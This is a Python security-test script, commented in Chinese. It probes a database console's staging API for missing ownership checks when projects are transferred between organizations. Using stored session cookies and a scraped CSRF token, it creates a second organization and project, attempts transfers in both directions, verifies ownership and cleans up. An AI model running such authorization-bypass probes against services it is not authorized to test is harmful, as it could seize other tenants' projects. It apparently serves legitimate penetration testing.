# -*- coding: utf-8 -*-
"""跨 org project_ids 归属校验攻击测试:
1. 建 org B(Referer header) + org B 建项目 dummy-B(body org_id 位置试错)
2. ★ source=org A, project_ids=[dummy-B(属于 org B)] -> 200? = 归属校验缺失(Critical)
3. ★ source=org B, project_ids=[A(属于 org A)] -> 反向校验
4. 清理
"""
import http.client, ssl, json, re, html, sys, os, time, uuid

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ORG_A = 'org-flat-dawn-91601224'
PID_A = 'orange-sun-90493739'

def ctl_req(method, path, body=None, referer=None, extra_hdrs=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=60)
    conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r = conn.getresponse()
    r.read()
    fresh = {}
    for sc in r.headers.get_all('Set-Cookie') or []:
        m = re.match(r'([^=]+)=([^;]*)', sc)
        if m:
            fresh[m.group(1)] = m.group(2)
    conn.close()
    conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=60)
    conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r2 = conn2.getresponse()
    txt = r2.read().decode('utf-8', 'replace')
    conn2.close()
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
    csrf = html.unescape(m.group(1)) if m else None
    parts = []
    for c in cookie_str().split(';'):
        c = c.strip()
        if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
            parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
        else:
            parts.append(c)
    conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=60)
    hdrs = {'Cookie': '; '.join(parts), 'User-Agent': 'Mozilla/5.0'}
    hdrs.update(HEADERS_TEST)
    if referer:
        hdrs['Referer'] = referer
    if extra_hdrs:
        hdrs.update(extra_hdrs)
    if body is not None:
        hdrs['Content-Type'] = 'application/json'
    if csrf:
        hdrs['X-CSRF-Token'] = csrf
    conn3.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=hdrs)
    r3 = conn3.getresponse()
    out = r3.read().decode('utf-8', 'ignore')
    conn3.close()
    return r3.status, out

REF = 'https://console-stage.neon.build/'

# 1. 建 org B
st, raw = ctl_req('POST', API_BASE + '/organizations', {'name': 'sec-orgb-' + uuid.uuid4().hex[:4]}, referer=REF)
print('[1] create org B -> %d %s' % (st, raw[:300]), flush=True)
org_b = None
try:
    org_b = json.loads(raw).get('id')
except Exception:
    pass
if not org_b:
    print('  abort: no org B', flush=True)
    sys.exit(1)
print('  org_b = %s' % org_b, flush=True)

# 2. org B 建项目(body org_id 变体)
dummy_b = None
for label, body in [
    ('body-org_id', {'org_id': org_b, 'project': {'name': 'sec-db', 'region_id': 'aws-us-east-2', 'pg_version': 17}}),
    ('body-project-org', {'project': {'name': 'sec-db', 'region_id': 'aws-us-east-2', 'pg_version': 17, 'org_id': org_b}}),
]:
    st, raw = ctl_req('POST', API_BASE + '/projects', body, referer=REF)
    print('[2] create project %s -> %d %s' % (label, st, raw[:250]), flush=True)
    try:
        dummy_b = json.loads(raw).get('project', {}).get('id')
        if dummy_b:
            print('  dummy_b = %s (created with %s)' % (dummy_b, label), flush=True)
            break
    except Exception:
        pass
    time.sleep(0.5)

# 3. ★ source=A transfer [dummy_b(属 org B)] -> 归属校验?
print('\n[3] ★ source=A transfer dummy_b(属于 B) -> A?', flush=True)
st, raw = ctl_req('POST', API_BASE + '/organizations/%s/projects/transfer' % ORG_A,
                  {'destination_org_id': ORG_A, 'project_ids': [dummy_b or 'sec-nonexist-00000000']})
print('  -> %d %s' % (st, raw[:400]), flush=True)

# 反向: source=B transfer [PID_A(属于 A)] -> B
print('\n[4] ★ source=B transfer A(属于 A) -> B?', flush=True)
st, raw = ctl_req('POST', API_BASE + '/organizations/%s/projects/transfer' % org_b,
                  {'destination_org_id': org_b, 'project_ids': [PID_A]})
print('  -> %d %s' % (st, raw[:400]), flush=True)

# 5. 项目归属终态确认
for pid, label in [(PID_A, 'A'), (dummy_b, 'dummyB')]:
    if not pid:
        continue
    st, raw = ctl_req('GET', API_BASE + '/projects/' + pid)
    try:
        d = json.loads(raw).get('project', {})
        print('  [%s] %s org=%s' % (label, pid, d.get('org_id')), flush=True)
    except Exception:
        print('  [%s] %s -> %d %s' % (label, pid, st, raw[:150]), flush=True)

# 6. 清理 org B + dummy
if dummy_b:
    st, raw = ctl_req('DELETE', API_BASE + '/projects/%s' % dummy_b)
    print('\n[6] cleanup dummy_b -> %d %s' % (st, raw[:200]), flush=True)
st, raw = ctl_req('DELETE', API_BASE + '/organizations/%s' % org_b)
print('cleanup org_b -> %d %s' % (st, raw[:200]), flush=True)
